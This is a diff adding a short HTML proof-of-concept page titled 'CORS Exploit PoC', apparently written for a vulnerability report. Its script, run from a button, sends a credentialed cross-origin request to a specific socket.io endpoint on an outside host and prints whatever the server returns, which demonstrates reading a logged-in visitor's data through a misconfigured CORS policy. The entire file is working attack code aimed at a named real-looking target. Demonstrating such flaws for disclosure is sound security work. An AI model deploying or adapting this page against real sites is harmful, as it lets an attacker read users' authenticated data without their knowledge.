@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>CORS Exploit Proof of Concept</h2>
+  <button onclick="exploit()">Execute Exploit</button>
+  <pre id="output"></pre>
+
+  <script>
+    function exploit() {
+      fetch("http://sgt.geekladder.com:8891/socket.io/?EIO=3&transport=polling&t=PSLXYiJ", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById("output").textContent = "Server Response:\n" + data;
+      })
+      .catch(error => {
+        document.getElementById("output").textContent = "Error:\n" + error;
+      });
+    }
+  </script>
+</body>
+</html>
